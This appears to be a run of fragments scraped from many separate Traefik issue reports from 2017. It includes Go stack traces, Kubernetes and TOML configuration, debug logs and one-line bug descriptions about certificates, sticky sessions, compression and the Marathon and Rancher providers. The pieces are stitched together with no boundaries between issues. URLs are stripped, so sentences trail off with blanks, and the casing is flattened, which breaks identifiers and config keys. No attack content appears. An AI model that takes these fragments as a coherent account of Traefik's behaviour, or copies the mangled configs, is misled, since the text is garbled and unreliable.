github.com/containous/traefik/vendor/github.com/boltdb/bolt.(*cursor).seek( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/boltdb/bolt/cursor.go:159 + fp= sp=
github.com/containous/traefik/vendor/github.com/boltdb/bolt.(*bucket).bucket( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/boltdb/bolt/bucket.go:112 + fp= sp=
github.com/containous/traefik/vendor/github.com/boltdb/bolt.(*tx).bucket( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/boltdb/bolt/tx.go:101 + fp= sp=
github.com/containous/traefik/vendor/github.com/docker/libkv/store/boltdb.(*boltdb).list.func1( , , ) /go/src/github.com/containous/traefik/vendor/github.com/docker/libkv/store/boltdb/boltdb.go:280 + fp= sp=
github.com/containous/traefik/vendor/github.com/boltdb/bolt.(*db).view( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/boltdb/bolt/db.go:629 + fp= sp=
github.com/containous/traefik/vendor/github.com/docker/libkv/store/boltdb.(*boltdb).list( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/docker/libkv/store/boltdb/boltdb.go:302 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:290 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
github.com/containous/traefik/vendor/github.com/containous/staert.(*kvsource).listrecursive( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/kv.go:309 + fp= sp=
...additional frames elided..
goroutine 21 [chan receive]:
github.com/containous/traefik/vendor/github.com/golang/glog.(*loggingt).flushdaemon( ) /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:882 +
created by github.com/containous/traefik/vendor/github.com/golang/glog.init.1 /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:410 + goroutine 23 [syscall, 3 minutes]:
os/signal.signal_recv( ) /usr/local/go/src/runtime/sigqueue.go:116 +
os/signal.loop() /usr/local/go/src/os/signal/signal_unix.go:22 +
created by os/signal.init.1 /usr/local/go/src/os/signal/signal_unix.go:28 + goroutine 24 [sleep]:
time.sleep( ) /usr/local/go/src/runtime/time.go:59 +
github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( ) /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
created by github.com/containous/traefik/vendor/github.com/thoas/stats.new /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:37 +
2\\3 are up and the third one couldn't get existing secret.
traefik exits with error code 2 when it cannot access secrets.
traefik continuously logging about being unable to access secrets.
hostname: d24d01ae0a01
ip: 127.0.0.1
ip: 172.19.0.2
get /whoami/healthcheck http/1.1
host: localhost
user-agent: mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/55.0.2883.87 safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
accept-encoding: gzip, deflate, sdch, br
accept-language: en-gb,en-us;q=0.8,en;q=0.6
cache-control: max-age=0
upgrade-insecure-requests: 1
x-forwarded-for: 172.19.0.1
x-forwarded-host: localhost
x-forwarded-proto: http
x-forwarded-server: 759fcea11e1b
x-replaced-path: /whoami/healthcheck
``` the presence of `x-replaced-path` in the header shows the `replacepath` rule was executed but no path substitution happened
### output of `traefik version`: ```
version: v1.3.1
codename: raclette
go version: go1.8.3
built: 2017-06-16_11:21:48am
os/arch: linux/amd64
stocked on the login screen
doubled recording of http requests / http request durations metrics
one time with the `service` label `http` (entrypoint) + `backend1`.
for some web clients, all requests go to the same app pod
* these client have a single traefik backend cookie
![snip20170612_9]( for some other web clients, requests for path path1 always to to pod a, request for path2 got to pod b, etc
* clients affected always have multiple traefik backend cookies, one per path
![screen shot 2017-06-12 at 4 18 20 pm]( * as many as 4 cookies, each with a different path have been observed ### output of `traefik version`
1.3.0 ### what is your environment & configuration traefik config
apiversion: v1
data: traefik.toml: | # traefik.toml loglevel = "info" defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [kubernetes] namespaces = ["sets"]
kind: configmap
metadata: creationtimestamp: 2017-06-06t23:08:37z labels: app: private-ingress name: private-ingress namespace: sets resourceversion: "105250320" selflink: /api/v1/namespaces/sets/configmaps/private-ingress uid: 12642da1-4b0d-11e7-a9df-0259bfeee5dc
``` app ingress resource
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik creationtimestamp: 2017-06-12t22:49:12z generation: 2 labels: app: jira env: archive name: jira-private-archive namespace: sets resourceversion: "107822544" selflink: /apis/extensions/v1beta1/namespaces/sets/ingresses/jira-private-archive uid: 5a4f53bf-4fc1-11e7-9ac4-02ba24f06372
spec: rules: - host: jiraarchive.nordstrom.net http: paths: - backend: servicename: jira-test serviceport: 8080 path: /
status: loadbalancer: {}
``` app svc
apiversion: v1
kind: service
metadata: annotations: traefik.backend.loadbalancer.sticky: "true" creationtimestamp: 2017-06-12t16:35:53z labels: app: jira component: jira env: test name: jira-test namespace: sets resourceversion: "107822074" selflink: /api/v1/namespaces/sets/services/jira-test uid: 33b4d522-4f8d-11e7-ad5f-02587911dfec
spec: clusterip: 25.0.143.41 ports: - name: jira port: 8080 protocol: tcp targetport: 8080 selector: app: jira component: jira env: test sessionaffinity: none type: clusterip
status: loadbalancer: {}
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
traefik added the prefix twice, redirecting to instead.
when i access the https url of a service, traefik gives me the default certificate instead of the let's encrypt one
when i go to the http url, it redirects me to the https url and the same problem occurs
i found this article : which solved my problem partially
i disabled the http redirection, and it works when i access the https url
but i'm not redirected when i access http.
then i re-enabled the http redirection, and everything works fine because the certificate is already present and valid.
however, it won't work on new urls for which i don't have the certificate yet
i'm using the latest version of traefik from the docker official image.
an intermittent http 404, the ip address in the url is not a valid ipv4 and the pathprefix is not correct in the access logs
### output of traefik version: (_what version of traefik are you using?_) [traefik v1.3.0 gnu/linux amd64](
traefik cleared the configuration and left all services offline.
everything is uploaded except my backends and frontends
there's simply no frontends or backends keys in consul.
traefik properly serves both `testapp.example.domain.com` and `multi.example.domain.com` domains with usage of given static wildcard crt, however `subdomain.multi.example.domain.com` is also served using that static wildcard crt causing a `err_cert_common_name_invalid` error
in the traefik ingress controller logs i got the following error
`level=warning msg="unknown ruletype addprefix: /notes for dev/notes-ui, falling back to pathprefix" ` also the prefix was not added to the path when i hit the configured url
rbac permission denied errors.
erro[2017-05-16t16:54:16z] error in go routine: runtime error: invalid memory address or nil pointer dereference
goroutine 57 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 +
github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:147 +
github.com/containous/traefik/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:138 +
panic( , ) /usr/local/go/src/runtime/panic.go:458 +
github.com/containous/traefik/provider.parserancherdata( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/provider/rancher.go:373 +
github.com/containous/traefik/provider.(*rancher).provide.func1.1( , ) /go/src/github.com/containous/traefik/provider/rancher.go:236 +
github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:32 +
github.com/containous/traefik/provider.(*rancher).provide.func1() /go/src/github.com/containous/traefik/provider/rancher.go:280 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:141 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:142 +
``` thank you
traefik crashes causing all routing to stop working
### steps to reproduce?
`docker-compose up` with the following compose file:
version: \'3\' services: webgateway: image: traefik:1.3.0-rc1-alpine command: - --docker - --web - --loglevel=debug ports: - "8080:8080" - "8000:80" volumes: - /var/run/docker.sock:/var/run/docker.sock error: image: nginx:alpine labels: - traefik.port=80 - traefik.frontend.auth.basic=
'consul.kvclient' expected type 'store.store', got 'string'
error loading configuration: 1 error(s) decoding:
errors connecting to the docker daemon on traefik, successful start of portainer.
acme request failed
restarting the traefik container makes it work fine, until a new exposed container is added.
i looked at my traefik logs and saw this error: ```
time="2017-04-29t20:39:10z" level=debug msg="docker connection established with docker 17.04.0-ce (api 1.28)" time="2017-04-29t20:39:10z" level=error msg="failed to list services for docker swarm mode, error error response from daemon: rpc error: code = 2 desc = proto: wrong wiretype = 2 for field desiredstates" ```
after enabling compression in the entrypoint all content is indeed gzipped, even if it was already compressed by the backend
in other words it is double-compressed
the browser then decompresses it once, outputting the resulting binary data as if it is text, i.e
unreadable.
erro[2017-04-28t16:03:22-05:00] failed to register for events, 404: <html>
<head><title>404 not found</title></head>
<body bgcolor="white">
<center><h1>404 not found</h1></center>
<hr><center>openresty/1.9.15.1</center>
observing the requests with charles proxy i can see that it is making a call to the endpoint at ` ` but since this is a dc/os marathon it should be using ` `
from what i can see in the go-marathon library it looks like it should be automatically adding the /marathon to the path whenever the dcostoken is present in the config
if i modify the marathon endpoint to be instead of just then the error that i get instead is `erro[2017-04-28t16:05:33-05:00] failed to create a client for marathon, error: marathon api error: uri not found: /marathon/v2/apps` and by observing the requests through charles proxy i can see that it connects to the events stream at ` ` but tries to get the apps from ` `.
traefik still tried to get certificates
ip address is missing
changes apply on the file in `integration/vendor/.../traefik`
### solutions - remove `./integration/vendor` and use the "root" vendor.
- manually manage the `./integration/vendor`
there is no address in the url
it just show as
time="2017-04-21t15:40:44z" level=debug msg="docker connection established with docker (api )"
time="2017-04-21t15:40:44z" level=error msg="failed to list containers for docker, error an error occurred trying to connect: get http: server gave http response to https client"
``` ### interesting notes problem is clearly related to trying to activate tls for docker ```toml
[docker.tls]
ca = "/etc/traefik/ir.crt"
cert = "/etc/traefik/${hostname}.pem"
key = "/etc/traefik/${hostname}.key"
insecureskipverify = true
if commenting those lines, we got a functional traefik without problem.
ir.crt is a concatenation of all certificates from all the ca chain (intermediate first, then root)
* intermediate signs ${hostname}.pem
* root signs intermediate ### first analysis seems that, with docker.lts option activated in toml configuration file, than https is used rather than unix protocol to retrieve containers
seems a bug to me
constant warning level logs of the form:
w service endpoints not found for redacted/redacted, falling back to service clusterip w service endpoints not found for redacted/redacted, falling back to service clusterip
w service endpoints not found for redacted/redacted, falling back to service clusterip
w service endpoints not found for redacted/redacted, falling back to service clusterip
w service endpoints not found for redacted/redacted, falling back to service clusterip
one line roughly every second or so per service
seems to be caused by [this line]( #l251)
given that `clusterip` is the default for a k8s service plus it's what the documentation uses, does this need to be a warning? perhaps lowering to debug or even removing would be appropriate.
only consulcatalog has entrypoints --- all default templates besides kubernetes.tmpl declare entrypoints configuration
having multiple configuration backends with acme leads to the situation where kubernetes frontends don't have any entrypoint.
providing custom templates as a workaround fixes the issue.
[kubernetes]
filename = "/etc/traefik/kubernetes_custom.tmpl"
[frontends]{{range $frontendname, $frontend := .frontends}} [frontends."{{$frontendname}}"] backend = "{{$frontend.backend}}" priority = {{$frontend.priority}} passhostheader = {{$frontend.passhostheader}} entrypoints = ["http", "https"] {{/* !!! workaround !!! */}} {{range $routename, $route := $frontend.routes}} [frontends."{{$frontendname}}".routes."{{$routename}}"] rule = "{{$route.rule}}" {{end}}
as result traefik shows an empty marathon tab and the mesos tap contains at least the docker task
if i change the ```ipsources = "mesos"``` to ```ipsources = "docker"``` i geth the ip of the docker task, but the universal containerizer is still not present
### if applicable, please paste the log output in debug mode (`--debug` switch) debug:
time="2017-04-05t10:07:33z" level=info msg="traefik version v1.2.1 built on 2017-03-27_03:19:40pm"
time="2017-04-05t10:07:33z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
time="2017-04-05t10:07:33z" level=debug msg="global configuration loaded {\\"gracetimeout\\":10,\\"debug\\":true,\\"checknewversion\\":true,\\"accesslogsfile\\":\\"\\",\\"traefiklogsfile\\":\\"\\",\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"network\\":\\"\\",\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"compress\\":false}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"insecureskipverify\\":false,\\"retry\\":null,\\"docker\\":null,\\"file\\":null,\\"web\\":{\\"address\\":\\":8080\\",\\"certfile\\":\\"\\",\\"keyfile\\":\\"\\",\\"readonly\\":false,\\"statistics\\":null,\\"metrics\\":null,\\"auth\\":null},\\"marathon\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"endpoint\\":\\" ",\\"domain\\":\\"marathon.localhost\\",\\"exposedbydefault\\":true,\\"groupsassubdomains\\":true,\\"dcostoken\\":\\"\\",\\"marathonlbcompatibility\\":true,\\"tls\\":null,\\"dialertimeout\\":60,\\"keepalive\\":10,\\"basic\\":null},\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":null,\\"mesos\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"endpoint\\":\\"zk://mesos3.domain.xyz:2181,mesos4.domain.xyz:2181,mesos5.domain.xyz:2181/mesos\\",\\"domain\\":\\"mesos.localhost\\",\\"exposedbydefault\\":true,\\"groupsassubdomains\\":false,\\"zkdetectiontimeout\\":30,\\"refreshseconds\\":30,\\"ipsources\\":\\"mesos\\",\\"statetimeoutsecond\\":30,\\"masters\\":null},\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null}"
time="2017-04-05t10:07:33z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:false}"
